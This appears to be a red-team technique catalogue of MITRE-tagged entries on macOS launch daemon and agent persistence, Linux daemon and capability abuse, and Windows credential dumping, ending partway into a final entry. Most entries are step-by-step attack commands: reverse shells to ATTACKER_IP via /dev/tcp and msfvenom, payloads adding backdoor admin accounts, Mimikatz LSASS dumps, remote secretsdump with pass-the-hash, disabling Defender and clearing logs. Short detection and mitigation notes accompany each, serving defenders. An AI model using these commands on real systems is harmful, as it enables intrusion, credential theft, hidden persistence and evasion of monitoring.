## Writable .plist Files in /Library/LaunchDaemons

- **Attack Type**: Privilege Escalation via Launch Daemons
- **Target**: macOS (all versions with LaunchDaemon support)
- **Vulnerability**: Misconfigured file permissionsWritable .plist loaded as root
- **MITRE**: T1543.004 (Create or Modify System Process: Launch Daemon)
- **Impact**: Full root privilege escalationPersistent backdoorPrivilege manipulation without kernel exploitation
- **Tools**: ✅ macOS Terminal✅ launchctl✅ nano or vi✅ chmod, chown, ls -l✅ Custom reverse shell payload or script
- **Scenario**: This technique exploits misconfigured permissions on .plist files within /Library/LaunchDaemons. If a user can modify these property list files, they can configure a launch daemon to execute arbitrary code as root during system boot or load time. Since launch daemons run with elevated privileges, a writable .plist file can be abused to gain persistent root access.
- **Attack Steps**: Step 1 – Identify Writable .plist FilesOpen Terminal and run:ls -l /Library/LaunchDaemons/*.plistLook for .plist files with write permissions for the current user or group. Example output:-rw-rw-r-- 1 user staff 512 Jul 7 15:32 com.example.vulnerable.plistStep 2 – Backup Original FileMake a copy of the file for restoration:cp /Library/LaunchDaemons/com.example.vulnerable.plist ~/backup.plistStep 3 – Modify the .plist FileOpen the file in a text editor:sudo nano /Library/LaunchDaemons/com.example.vulnerable.plistReplace or edit the ProgramArguments field to point to a script or binary you control:xml<br><key>ProgramArguments</key><array><string>/bin/bash</string><string>-c</string><string>/tmp/root_payload.sh</string></array><br>Step 4 – Create Malicious PayloadCreate a script that adds a root user or reverse shell:echo 'dscl . -create /Users/hackroot; dscl . -create /Users/hackroot UserShell /bin/bash; dscl . -create /Users/hackroot UniqueID 401; dscl . -create /Users/hackroot PrimaryGroupID 20; dscl . -create /Users/hackroot NFSHomeDirectory /Users/hackroot; dscl . -passwd /Users/hackroot password123; dscl . -append /Groups/admin GroupMembership hackroot' > /tmp/root_payload.shMake it executable:chmod +x /tmp/root_payload.shStep 5 – Load the LaunchDaemonUse launchctl to load the modified file:sudo launchctl load /Library/LaunchDaemons/com.example.vulnerable.plistThe script will now execute as root. Verify:id hackroot or attempt su hackroot with the password.Step 6 – Cleanup (For Ethical Purposes)Unload the plist:sudo launchctl unload /Library/LaunchDaemons/com.example.vulnerable.plistRestore original file:sudo cp ~/backup.plist /Library/LaunchDaemons/com.example.vulnerable.plistDelete created user:sudo dscl . -delete /Users/hackrootRemove /tmp/root_payload.sh💡 Tip: This method does not require a kernel exploit, making it stealthier on secured macOS systems.
- **Detection**: - Monitor .plist file modifications- Use auditd or fs_usage- Track unauthorized launchctl load attempts
- **Solution**: - Ensure proper permissions: only root writable- Disable unneeded daemons- Monitor LaunchDaemons directory- Use macOS SIP and JAMF policies
- **Tags**: #macOS #PrivilegeEscalation #LaunchDaemonExploit #PlistAbuse #RootAccess #RedTeam #macOSEscalation

## Creating a New Malicious Launch Daemon

- **Attack Type**: Privilege Escalation via New Launch Daemon
- **Target**: macOS Systems (Root access required)
- **Vulnerability**: LaunchDaemons executing root-level scripts through crafted or rogue .plist files
- **MITRE**: T1543.004 – Create or Modify System Process: Launch Daemon
- **Impact**: Persistent root-level executionBypasses TCC & SIP controlsSystem compromise upon reboot
- **Tools**: ✅ macOS Terminal✅ Text Editor (nano, vi)✅ launchctl✅ chmod, chown✅ Payload script (e.g., reverse shell or user creation)
- **Scenario**: This attack simulates an adversary creating a new malicious LaunchDaemon in /Library/LaunchDaemons/ on macOS to execute arbitrary commands as root during system startup. This is possible when the attacker already has write access (e.g., via privilege escalation, sudo, or poorly configured permissions). The daemon ensures persistence and can run malicious payloads with root privileges upon reboot or manually triggered loading.
- **Attack Steps**: Step 1 – Prepare a Malicious PayloadCreate a script in /tmp that performs an action (e.g., create a root user, run reverse shell):nano /tmp/rootpayload.shExample payload:#!/bin/bashdscl . -create /Users/rootxdscl . -create /Users/rootx UserShell /bin/bashdscl . -create /Users/rootx UniqueID 501dscl . -create /Users/rootx PrimaryGroupID 80dscl . -create /Users/rootx NFSHomeDirectory /Users/rootxdscl . -passwd /Users/rootx password123dscl . -append /Groups/admin GroupMembership rootxMake it executable:chmod +x /tmp/rootpayload.shStep 2 – Create the .plist FileNavigate to LaunchDaemons:cd /Library/LaunchDaemons/Create a new .plist file:sudo nano com.apple.update.plistInsert the following XML:xml<br><?xml version="1.0" encoding="UTF-8"?> <br> <!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd"> <br><plist version="1.0"> <br> <dict> <br> <key>Label</key><string>com.apple.update</string> <br> <key>ProgramArguments</key><array> <br> <string>/bin/bash</string> <string>/tmp/rootpayload.sh</string> <br> </array> <br> <key>RunAtLoad</key><true/> <br> </dict> <br></plist><br>Save and exit the file.Step 3 – Set Proper Permissionssudo chown root:wheel com.apple.update.plistsudo chmod 644 com.apple.update.plistStep 4 – Load the DaemonRun:sudo launchctl load /Library/LaunchDaemons/com.apple.update.plistThis will execute the payload with root privileges.Verify user creation:dscl . -read /Users/rootx or try su rootxStep 5 – Optional Persistence TestReboot the system and observe the daemon execution. If RunAtLoad is set, the payload will run again.Step 6 – Cleanup (For Ethical Testing)Unload the daemon:sudo launchctl unload /Library/LaunchDaemons/com.apple.update.plistDelete plist and payload:sudo rm /Library/LaunchDaemons/com.apple.update.plistsudo rm /tmp/rootpayload.shRemove created user:sudo dscl . -delete /Users/rootx💡 Tip: Use system logs (log show) to trace daemon execution.
- **Detection**: - Monitor /Library/LaunchDaemons/ for unauthorized .plist- Use endpoint monitoring tools- Log alert on suspicious daemon loading
- **Solution**: - Restrict write access to /Library/LaunchDaemons/- Audit LaunchDaemon loads- Enforce system integrity protection (SIP)- Harden sudo policies
- **Tags**: #macOS #PrivilegeEscalation #LaunchDaemon #PlistBackdoor #RootPersistence #RedTeam #PostExploit

## Hijacking an Existing Daemon Executable

- **Attack Type**: Privilege Escalation via Binary Replacement
- **Target**: Linux Servers / Embedded Devices
- **Vulnerability**: Writable daemon executable paths due to improper file permissions
- **MITRE**: T1574.010 – Hijack Execution Flow: Services File Permissions Weakness
- **Impact**: Root privilege escalationBackdoor persistenceArbitrary code execution as root
- **Tools**: ✅ Linux Terminal✅ systemctl / service✅ chmod, chown✅ Reverse shell payload (msfvenom, nc) or custom script
- **Scenario**: This attack demonstrates how an adversary with write permissions to an existing daemon's binary (e.g., due to misconfigured file ownership or improper permissions) can replace the legitimate executable with a malicious payload. Once the daemon is started or restarted (manually or via system reboot), the malicious binary executes with elevated privileges (typically root), enabling privilege escalation or persistent backdoor access.
- **Attack Steps**: Step 1 – Identify a Writable Daemon ExecutableRun:find /etc/systemd/system /lib/systemd/system -type f -exec ls -l {} \; 2>/dev/nullLook for service files pointing to binaries that are world-writable or owned by non-root users.Step 2 – Inspect the Daemon ConfigurationExample:cat /etc/systemd/system/mydaemon.serviceCheck the ExecStart path, e.g., /usr/local/bin/mydaemonStep 3 – Check Executable Permissionsls -l /usr/local/bin/mydaemonIf writable:-rwxrwxrwx 1 user user 12345 /usr/local/bin/mydaemonProceed to replace.Step 4 – Backup the Original Executablecp /usr/local/bin/mydaemon /tmp/mydaemon_backupStep 5 – Create a Malicious ExecutableOption 1 – Bash reverse shell:echo -e '#!/bin/bash\nbash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1' > /usr/local/bin/mydaemonOption 2 – Use msfvenom:msfvenom -p linux/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4444 -f elf > /usr/local/bin/mydaemonStep 6 – Set Proper Permissionschmod +x /usr/local/bin/mydaemonStep 7 – Restart the Daemonsudo systemctl restart mydaemon.serviceOr:sudo service mydaemon restartStep 8 – Catch the Shell (Attacker Side)On attacker machine:nc -lvnp 4444Wait for reverse shell connection.Step 9 – Post-Exploitation (Ethical Scope)Check user identity:whoami → should return rootPerform necessary tests (e.g., privilege checks).Step 10 – CleanupRestore original binary:mv /tmp/mydaemon_backup /usr/local/bin/mydaemonRestart service:sudo systemctl restart mydaemon💡 Tip: This technique works when binaries are misconfigured as writable by non-privileged users – a critical configuration flaw.
- **Detection**: - Monitor changes in system daemon binaries using tripwire, aide, or auditd- Use systemctl status logs and diff binaries- Check for unauthorized service behavior via journald (journalctl)
- **Solution**: - Enforce correct file permissions (chmod 755)- Ensure daemon executables are owned by root and immutable if possible- Audit system services and binary paths regularly- Apply principle of least privilege
- **Tags**: #Linux #PrivilegeEscalation #BinaryHijack #ServiceAbuse #PostExploitation #RedTeam #MisconfiguredPermissions

## Using Launch Agents for Persistence

- **Attack Type**: User-Level Persistence (macOS)
- **Target**: macOS (user-level)
- **Vulnerability**: Abuse of LaunchAgents for autostart execution
- **MITRE**: T1547.001 - Boot or Logon Autostart Execution: Launch Agents
- **Impact**: Enables persistent access without root, stealthy post-exploitation foothold
- **Tools**: macOS terminal, launchctl, nano, plutil, Netcat, bash
- **Scenario**: This technique allows an attacker to maintain persistence on macOS systems by creating a Launch Agent plist file in the user's ~/Library/LaunchAgents/ directory. These Launch Agents are loaded automatically at user login and can execute any script or binary without needing root privileges.
- **Attack Steps**: Step 1: Prepare a Reverse Shell PayloadCreate a simple reverse shell script to connect back to the attacker's machine:echo '#!/bin/bash\nbash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1' > ~/.rev.shMake it executable:chmod +x ~/.rev.shStep 2: Create the LaunchAgents Directory (if it doesn’t exist)mkdir -p ~/Library/LaunchAgentsStep 3: Write a Malicious Launch Agent Plistnano ~/Library/LaunchAgents/com.apple.update.plistAdd the following contents (replace username and path accordingly):xml<br><?xml version="1.0" encoding="UTF-8"?><br> <!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd"><br><plist version="1.0"><dict><br> <key>Label</key><string>com.apple.update</string><br> <key>ProgramArguments</key><array><string>/bin/bash</string><string>/Users/username/.rev.sh</string></array><br> <key>RunAtLoad</key><true/><br></dict></plist><br>Step 4: Load the Launch AgentRun:launchctl load ~/Library/LaunchAgents/com.apple.update.plistStep 5: Start Netcat Listener on Attacker’s MachineOn attacker system:nc -nlvp 4444Step 6: Validate ExecutionLog out and back in on the victim’s account.The reverse shell should connect back automatically.Step 7: Cleanup (Ethical Use Only)Unload the agent:launchctl unload ~/Library/LaunchAgents/com.apple.update.plistDelete the files:rm ~/Library/LaunchAgents/com.apple.update.plist && rm ~/.rev.shEnsure system is restored to original state after test.
- **Detection**: Monitor ~/Library/LaunchAgents/ for new or unknown plist files, audit user login items, check for loaded agents via launchctl list
- **Solution**: Disable LaunchAgents in monitored environments, restrict write permissions, monitor plist changes, use EDR to flag suspicious agents
- **Tags**: #macOS #Persistence #LaunchAgents #ReverseShell #T1547 #UserPersistence #PostExploitation

## Dump Using Built-in reg save Command

- **Attack Type**: Credential Dumping via Registry Export
- **Target**: Windows (Local System or Domain Workstation)
- **Vulnerability**: Abuse of reg save command to extract sensitive registry hives
- **MITRE**: T1003.002 – OS Credential Dumping: Security Account Manager
- **Impact**: Offline password hash extraction, NTLM reuse, lateral movement, privilege escalation
- **Tools**: Windows CMD or PowerShell, reg.exe, Mimikatz (offline), secretsdump.py (Impacket), Administrator/SYSTEM privileges
- **Scenario**: On Windows systems, sensitive credential data like SAM (Security Account Manager), SYSTEM, and SECURITY hives are stored in the registry. If an attacker has administrative privileges or SYSTEM-level access, they can use the built-in reg save command to dump these hives for offline credential extraction using tools like Mimikatz or secretsdump.py. This technique does not require external tools and can be performed using default Windows utilities.
- **Attack Steps**: Step 1: Gain Local Admin or SYSTEM Access• Ensure attacker has Administrator or SYSTEM rights (via service exploit, privilege escalation, etc.)Step 2: Open CMD with Elevated Privileges• Start an elevated CMD shell (run as Administrator)Step 3: Create a Dump Foldercmd<br>mkdir C:\regdump<br>Step 4: Dump Registry HivesUse reg save to extract the hives:cmd<br>reg save HKLM\SAM C:\regdump\SAM<br>reg save HKLM\SYSTEM C:\regdump\SYSTEM<br>reg save HKLM\SECURITY C:\regdump\SECURITY<br>✅ Files will be saved in binary formatStep 5: Transfer the Dumps for Offline Extraction• Use SMB, scp, Netcat, etc., to exfiltrate the dumped files to the attacker’s machineStep 6: Extract Password HashesOption A: Use Mimikatzcmd<br>mimikatz.exe<br>privilege::debug<br>lsadump::sam /system:C:\regdump\SYSTEM /sam:C:\regdump\SAM<br>Option B: Use Impacket’s secretsdump:bash<br>secretsdump.py -system SYSTEM -sam SAM -security SECURITY LOCAL<br>Step 7: Use Extracted Hashes• Pass-the-Hash• Crack using hashcat or john• Reuse NTLM hashes for lateral movementStep 8: Cleanup (Ethical Use)• Delete the registry dump files:cmd<br>del /f /q C:\regdump\*<br>rmdir C:\regdump<br>
- **Detection**: Monitor process activity for suspicious use of reg.exe targeting SAM/SYSTEM, EDR alerts on hive access, check for unauthorized file creation in temp/system paths
- **Solution**: Restrict local admin access, enable LSA protection, use Credential Guard, audit and alert on registry hive access, block reg.exe via AppLocker
- **Tags**: #Windows #regsave #CredentialDumping #RedTeam #NTLM #SAM #OfflineHashExtraction #Persistence

## Offline Dump from C:\Windows\System32\Config

- **Attack Type**: Credential Dumping via Offline Registry Access
- **Target**: Windows OS (Offline or Mounted)
- **Vulnerability**: Registry hive files are world-readable when accessed offline from disk
- **MITRE**: T1003.002 – OS Credential Dumping: SAM
- **Impact**: Complete credential compromise including local admin, NTLM, and cached secrets
- **Tools**: ✅ Bootable USB with Linux or Kali✅ Disk mount tools (e.g., mount, FTK Imager)✅ Impacket secretsdump.py✅ Mimikatz✅ Physical or remote disk access
- **Scenario**: When an attacker gains physical access to a Windows system (or has a mounted disk image), they can extract critical registry hives — SAM, SYSTEM, and SECURITY — directly from C:\Windows\System32\Config, bypassing live system protections. These files store sensitive credential data like password hashes and can be used for offline credential dumping using tools like secretsdump.py or Mimikatz. This method is stealthier than live dumping and works even if the OS is not running.
- **Attack Steps**: Step 1: Gain Physical or Disk Image Access• Remove the hard drive from the target system OR• Use virtualization snapshot OR• Mount an E01/RAW disk image via forensic toolsStep 2: Mount the Windows PartitionOn Linux:bash<br>mkdir /mnt/win<br>mount /dev/sdX1 /mnt/win<br>Step 3: Navigate to the Registry Hive Directorybash<br>cd /mnt/win/Windows/System32/config<br>ls -l<br>Look for:• SAM• SYSTEM• SECURITYStep 4: Copy the Registry Filesbash<br>cp SAM SYSTEM SECURITY ~/regdumps/<br>Step 5: Use Impacket’s secretsdump.py (Offline)bash<br>secretsdump.py -sam SAM -system SYSTEM -security SECURITY LOCAL<br>Output includes:• NTLM hashes• User account detailsStep 6: Optionally Use Mimikatzcmd<br>mimikatz<br>privilege::debug<br>lsadump::sam /sam:SAM /system:SYSTEM<br>Step 7: Use Extracted Hashes• Crack with hashcat or john• Pass-the-Hash with Metasploit or CrackMapExecStep 8: Cleanup (Ethical Use)• Securely delete copied files• Audit chain of custody if done in forensics🧠 Notes:• This method bypasses OS protections like Credential Guard or LSA Protection since it's offline• Can be used during incident response, DFIR, or red team physical engagements
- **Detection**: Monitor access to physical disksAudit logs for offline registry access attemptsBitLocker alerts on unauthorized boot device use
- **Solution**: Enable full-disk encryption (BitLocker)Use BIOS passwordDisable boot from USBRestrict physical accessEncrypt backups and drive images
- **Tags**: #OfflineDump #SAM #SYSTEM #NTLMHashes #CredentialDump #Impacket #RedTeam #DigitalForensics #BitLockerBypass #PhysicalSecurity

## Mimikatz Live Dump (Local SYSTEM)

- **Attack Type**: Credential Dumping (Live)
- **Target**: Windows OS (Live, with SYSTEM access)
- **Vulnerability**: Access to LSASS process memory with SYSTEM privileges
- **MITRE**: T1003.001 – OS Credential Dumping: LSASS Memory
- **Impact**: Exposure of all cached credentials on the system, including domain admin, Kerberos tickets, and NTLM hashes
- **Tools**: ✅ Mimikatz✅ Administrator/SYSTEM access✅ PowerShell or Command Prompt✅ Procdump (optional)✅ Task Manager (for verification)
- **Scenario**: This attack involves using the Mimikatz tool to extract plaintext credentials, NTLM hashes, Kerberos tickets, and other secrets from the memory of the lsass.exe process while the Windows machine is running. The attacker must have SYSTEM-level privileges on the local machine. Often used post-exploitation after privilege escalation to extract local and domain credentials for lateral movement.
- **Attack Steps**: Step 1: Gain SYSTEM Privileges• Confirm that the user is NT AUTHORITY\SYSTEM or Administrator.• Use privilege escalation methods (e.g., exploit, token impersonation, PsExec).Step 2: Disable Defender/EDR (for Lab Simulation Only)powershell<br>Set-MpPreference -DisableRealtimeMonitoring $true<br>Or disable via Group Policy.Step 3: Download and Prepare Mimikatz• Download from the official GitHub mirror.• Unzip and place in accessible folder (e.g., C:\Temp\mimi\).Step 4: Run Mimikatz as AdministratorOpen CMD as Administrator:cmd<br>cd C:\Temp\mimi<br>mimikatz.exe<br>Step 5: Enable Debug Privileges<br>privilege::debug<br>✅ Output: "Privilege '20' OK"Step 6: Dump Credentials from LSASS<br>sekurlsa::logonpasswords<br>✅ Output includes:• Username• Domain• NTLM Hash• Clear-text password (if available)• Kerberos ticketsOptional: Dump via Procdump and Analyze Offlinecmd<br>procdump -ma lsass.exe lsass.dmp<br>mimikatz "sekurlsa::minidump lsass.dmp" "sekurlsa::logonpasswords"<br>Step 7: Use Extracted Hashes/Tickets• Use in Pass-the-Hash, Pass-the-Ticket, Overpass-the-Hash• Example: Crack password with hashcatStep 8: Clean Up• Delete mimikatz.exe and dumps• Clear logs with wevutil cl (for lab only)• Restore Defenderpowershell<br>Set-MpPreference -DisableRealtimeMonitoring $false<br>
- **Detection**: - Monitor lsass.exe access (Event ID 4663)- Use Sysmon for parent-child process monitoring- Alert on usage of mimikatz.exe or related tools
- **Solution**: - Enable Credential Guard- Use EDR with LSASS protection- Harden LSASS using RunAsPPL- Limit local admin access- Disable WDigest
- **Tags**: #Mimikatz #CredentialDumping #LSASS #RedTeam #WindowsSecurity #PassTheHash #Kerberos #OffensiveSecurity

## Metasploit SAM Dump Module

- **Attack Type**: Credential Dumping (Offline SAM Extraction)
- **Target**: Windows Systems (Local Access Required)
- **Vulnerability**: Insecure storage of password hashes in SAM database accessible with SYSTEM privileges
- **MITRE**: T1003.002 – OS Credential Dumping: Security Account Manager (SAM)
- **Impact**: Full compromise of local user accounts; potential domain admin hash exposure on workstations
- **Tools**: ✅ Metasploit Framework✅ Meterpreter session with SYSTEM privileges✅ Local Admin or SYSTEM shell✅ Kali Linux or Parrot OS (Attacker)✅ Hashcat or JohnTheRipper (for cracking)
- **Scenario**: This attack uses the post/windows/gather/hashdump module in Metasploit to dump credentials from the Windows Security Account Manager (SAM) database. It requires a valid meterpreter session with SYSTEM privileges, often obtained after initial exploitation or privilege escalation. The extracted NTLM hashes can be cracked offline or used in pass-the-hash attacks.
- **Attack Steps**: Step 1: Establish Meterpreter Session• Exploit the target system using Metasploit (e.g., EternalBlue, exploit/windows/smb/ms17_010_eternalblue, or browser exploit).• Confirm that a Meterpreter session is active:<br>sessions -i<br>Step 2: Escalate Privileges to SYSTEM (if needed)• Use built-in escalation modules:<br>use post/windows/escalate/getsystem<br>run<br>• Confirm privilege:<br>getuid<br>✅ Output: "NT AUTHORITY\SYSTEM"Step 3: Load Hashdump Module• Use the hashdump post module:<br>use post/windows/gather/hashdump<br>set SESSION <session_id><br>run<br>Step 4: Analyze Output✅ Output example:<br>Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::<br>Guest:501:aad3b435b51404eeaad3b435b51404ee:4d186321c1a7f0f354b297e8914ab240:::<br>• NTLM hashes can now be cracked offline.Step 5: Crack the Hashes (Offline)• Save to a file hashes.txt, then run:bash<br>hashcat -m 1000 -a 0 hashes.txt /usr/share/wordlists/rockyou.txt<br>orbash<br>john hashes.txt --wordlist=/usr/share/wordlists/rockyou.txt<br>Step 6: Use in Pass-the-Hash or Authentication Abuse• Use extracted hash in Pass-the-Hash (e.g., with pth-winexe, impacket, or smbexec).Step 7: Clean Up (Ethical Lab Use Only)• Clear logs if needed (clearev in meterpreter).• End session: exit
- **Detection**: - Monitor for use of Meterpreter or suspicious access to SAM- EDR tools that flag hashdump behavior- Log event ID 4624, 4672, and LSASS access attempts
- **Solution**: - Apply LSASS protections- Use Credential Guard- Limit local admin access- Enable logging and detection for post-exploitation tools- Patch known exploits used for initial access
- **Tags**: #Metasploit #Hashdump #CredentialDumping #PostExploitation #RedTeam #SAMDatabase #PassTheHash #WindowsSecurity

## secretsdump.py (Impacket)

- **Attack Type**: Credential Dumping via Remote NTDS.dit & SAM Extraction
- **Target**: Windows Workstations & Servers (including Domain Controllers)
- **Vulnerability**: Weak protection of credential secrets over SMB and access via admin creds
- **MITRE**: T1003.006 – OS Credential Dumping: DCSyncT1003.002 – SAM
- **Impact**: Exposure of domain/local user hashes; offline cracking or direct abuse via pass-the-hash
- **Tools**: ✅ Kali Linux / Parrot OS✅ Impacket suite (secretsdump.py)✅ Valid Admin Credentials or SYSTEM access✅ Network access to target✅ Hashcat / JohnTheRipper (optional for cracking)
- **Scenario**: This scenario demonstrates how attackers can use Impacket’s secretsdump.py to remotely extract password hashes from the NTDS.dit file (Active Directory) or SAM/LSA secrets from Windows systems. This does not require remote code execution — only valid credentials (e.g., admin account) and network access to the target. The hashes can then be cracked offline or abused using pass-the-hash.
- **Attack Steps**: Step 1: Set Up Attacker Environment• On Kali/Parrot OS, ensure impacket is installed:bash<br>sudo apt install impacket -y<br>orbash<br>git clone https://github.com/SecureAuthCorp/impacket.git && cd impacket && pip install .<br>Step 2: Identify Target Host• Use nmap or ping to confirm host availability:bash<br>ping 192.168.1.10<br>nmap -p 445 192.168.1.10<br>✅ Port 445 (SMB) must be open.Step 3: Run secretsdump.py for Local SAM/LSA Dump (if SYSTEM shell)• If you already have local SYSTEM access (e.g., via Meterpreter or physical shell), dump locally:bash<br>secretsdump.py -sam SAM -system SYSTEM -security SECURITY LOCAL<br>Step 4: Remote Dump via SMB using Credentials• To extract remotely using valid credentials:bash<br>secretsdump.py DOMAIN/Administrator:Password@192.168.1.10<br>• Can also use hashes (Pass-the-Hash):bash<br>secretsdump.py DOMAIN/Administrator@192.168.1.10 -hashes aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0<br>Step 5: Analyze the Output✅ You will get NTLM hashes like:<br>Administrator:500:aad3b435b51404eeaad3b435b51404ee:e19ccf75ee54e06b06a5907af13cef42:::<br>• Includes domain credentials, LSA secrets, cached credentials (if configured).Step 6: Offline Cracking (Optional)• Save hashes to a file:nano hashes.txt• Use Hashcat or John:bash<br>hashcat -m 1000 -a 0 hashes.txt rockyou.txt<br>john hashes.txt --wordlist=rockyou.txt<br>Step 7: Use Extracted Hashes in Further Attacks• Lateral movement (e.g., pth-smbclient, wmiexec.py) with hashes• NTLM relay, Golden/Silver ticket attacks (if DSRM/krbtgt is leaked)Step 8: Cleanup (If Lab Setup)• Terminate sessions and logs (e.g., clear history on Linux)• Reset compromised passwords🧠 Tip: This technique works silently without dropping executables — ideal for stealthy credential theft.
- **Detection**: - Monitor SMB connections- Alert on unusual use of built-in accounts- SIEM logs (Windows Event IDs 4624, 4648)- Detect secretsdump tool strings with EDR
- **Solution**: - Disable SMBv1- Limit admin access- Enable LAPS for local account management- Use strong passwords and monitor SMB share access- Segment network & implement firewall rules
- **Tags**: #Impacket #secretsdump #CredentialDumping #NTDS #LSASecrets #RedTeam #OSExploits #PassTheHash

## Direct Registry Read via PowerShell

- **Attack Type**: Credential Harvesting via Registry Access
- **Target**: Windows WorkstationsDomain ControllersWindows Servers
- **Vulnerability**: Unrestricted access to sensitive registry keys via PowerShell by privileged users
- **MITRE**: T1003.002 – OS Credential Dumping: SAMT1112 – Modify Registry
- **Impact**: Exposure of user credentials (NTLM hashes), persistence mechanisms, or user behavior insights
- **Tools**: ✅ PowerShell✅ Local or Remote Admin Access✅ Optional: SYSTEM shell
- **Scenario**: This simulation demonstrates how an attacker with local or remote access can use PowerShell to read sensitive registry hives directly from a Windows system. Common targets include SAM, SYSTEM, and SECURITY hives for credential data, and Run/RunOnce keys for persistence mechanisms. This technique is used in post-exploitation for privilege escalation or credential dumping.
- **Attack Steps**: Step 1: Identify Access Level• Confirm you have local administrative privileges or SYSTEM shell.• Run in a high-integrity PowerShell session:powershell<br>whoami /groups<br>✅ Must have SeBackupPrivilege or be SYSTEM.Step 2: Open PowerShell with Admin Rights• Right-click PowerShell and run as administrator.Step 3: Read the SAM Hive• Attempt to directly access the SAM file:powershell<br>reg save HKLM\SAM C:\Temp\SAM.bak<br>reg save HKLM\SYSTEM C:\Temp\SYSTEM.bak<br>reg save HKLM\SECURITY C:\Temp\SECURITY.bak<br>✅ If successful, files will be created in C:\Temp.Step 4: Inspect Registry Keys for Credentials• Read values in PowerShell:powershell<br>Get-ItemProperty -Path "HKLM:\SAM\SAM\Domains\Account\Users"<br>• You may see hashed values for users (RID 500 = Administrator).Step 5: Enumerate AutoRun Entries• Check persistence keys:powershell<br>Get-ItemProperty -Path "HKLM:\Software\Microsoft\Windows\CurrentVersion\Run"<br>Get-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"<br>✅ Used to detect userland persistence (malicious scripts, binaries, etc.)Step 6: Dump and Analyze• Export interesting registry paths:powershell<br>reg export "HKLM\SAM" C:\Temp\sam.reg<br>• You can now analyze the dumped hives offline with tools like SecretsDump, Mimikatz, or RegRipper.Step 7: (Optional) Use Volume Shadow Copy to Bypass Locked Files• Create a shadow copy:powershell<br>wmic shadowcopy call create Volume='C:\'<br>• Access locked SYSTEM/SAM files from the shadow volume path:powershell<br>copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SAM C:\Temp\SAM<br>🧠 This technique avoids traditional EDR detection since it uses built-in tools and reads from authorized keys or VSS.Step 8: Clean Up (If Lab)• Delete saved files:powershell<br>Remove-Item C:\Temp\SAM*<br>Remove-Item C:\Temp\SYSTEM*<br>
- **Detection**: - Monitor reg save, reg export, and PowerShell logging (Event ID 4104)- SIEM rules for access to SAM/SYSTEM paths- EDR alerts for access to sensitive registry hives
- **Solution**: - Apply least privilege access- Block access to registry via AppLocker or GPO- Enable PowerShell logging and transcription- Harden Volume Shadow Copy access- Enable Credential Guard on endpoints
- **Tags**: #RegistryDump #PowerShellAbuse #WindowsHives #SAMDump #CredentialAccess #ForensicsReady #BlueTeam

## Check for Misconfigured Capabilities

- **Attack Type**: Privilege Escalation via Linux Capabilities
- **Target**: Linux WorkstationsServersContainerized EnvironmentsCI/CD Runners
- **Vulnerability**: Misconfigured or excessive Linux capabilities on user-controlled binaries
- **MITRE**: T1548.001 – Abuse Elevation Control Mechanism: Setuid and Capabilities
- **Impact**: Local privilege escalationBypass of file system restrictionsRoot shell access via user binaries
- **Tools**: ✅ Kali Linux or any Linux VM✅ getcap, setcap, capsh, find✅ Optional: python3, bash, nmap, perl binaries
- **Scenario**: This simulation explores how attackers can enumerate and exploit misconfigured file capabilities in Linux systems. Linux capabilities break down root privileges into discrete units and assign them to binaries. If a binary has inappropriate capabilities (e.g., cap_setuid, cap_sys_admin), a user may escalate to root or perform unauthorized actions. Common abuses include assigning capabilities to interpreters like Python or Bash.
- **Attack Steps**: Step 1: Enumerate All Files with CapabilitiesRun the following command to find all files with extended Linux capabilities:bash<br>sudo getcap -r / 2>/dev/null<br>✅ This lists binaries like /usr/bin/python3.8 = cap_setuid+ep.Step 2: Identify Dangerous CapabilitiesFocus on files with the following capabilities:• cap_setuid+ep → may allow privilege escalation• cap_dac_read_search+ep → bypass file permissions• cap_sys_admin+ep → highly privileged actionsStep 3: Analyze Context of Capable BinariesCheck:• Who owns the file (should NOT be world-writable)• What the binary is (e.g., interpreter, nmap, custom app)• Whether it's user-controllable or writableStep 4: Exploit Capable Interpreter (Example: Python)If Python or Perl has cap_setuid+ep, you can run:bash<br>python3 -c 'import os; os.setuid(0); os.system("/bin/sh")'<br>✅ This opens a root shell if setuid is enabled.Step 5: Abuse cap_dac_read_search+epThis allows you to read otherwise inaccessible files:bash<br>/path/to/binary /etc/shadow<br>✅ Useful for password hash extraction.Step 6: Check for Misuse of setcapIf you can use setcap, you can assign dangerous capabilities to harmless binaries:bash<br>sudo setcap cap_setuid+ep /usr/bin/python3.8<br>✅ This is often misconfigured or left enabled in CI/CD or DevOps setups.Step 7: Clean Up (If Ethical Lab)• Remove capabilities:bash<br>sudo setcap -r /usr/bin/python3.8<br>• Reset test environment permissions🧠 Pro Tip:• Many binaries like nmap, vim, or perl support shell escapes that become dangerous when given capabilities. Always audit interpreter binaries first.
- **Detection**: - Monitor file capabilities using getcap regularly- Audit for sensitive capabilities (cap_setuid, cap_sys_admin)- Log capability changes
- **Solution**: - Restrict usage of setcap to root-only- Remove unnecessary capabilities- Monitor with file integrity tools (e.g., AIDE)- Avoid giving interpreters elevated capabilities
- **Tags**: #LinuxCapabilities #PrivilegeEscalation #Getcap #SetcapMisuse #LocalRoot #SecurityMisconfig #RedTeamLinux

## Privilege Escalation via cap_setuid on Custom Binary

- **Attack Type**: Local Privilege Escalation
- **Target**: Linux SystemsDev EnvironmentsContainersCI/CD Pipelines
- **Vulnerability**: Misuse of Linux capabilities (cap_setuid) on user-modifiable binaries
- **MITRE**: T1548.001 – Abuse Elevation Control Mechanism: Setuid and Capabilities
- **Impact**: - Local root shell- Full system control- Container escape (in some contexts)
- **Tools**: ✅ Kali Linux or any Linux distro✅ gcc or any C compiler✅ setcap, getcap, id, bash
- **Scenario**: This scenario explores how an attacker can escalate privileges by abusing a custom binary with the cap_setuid+ep capability. If a binary owned by a low-privileged user is granted this capability, it can set its UID to 0 and spawn a root shell. This attack is especially dangerous in development or CI/CD environments where developers or automation scripts have permission to modify binaries and assign capabilities.
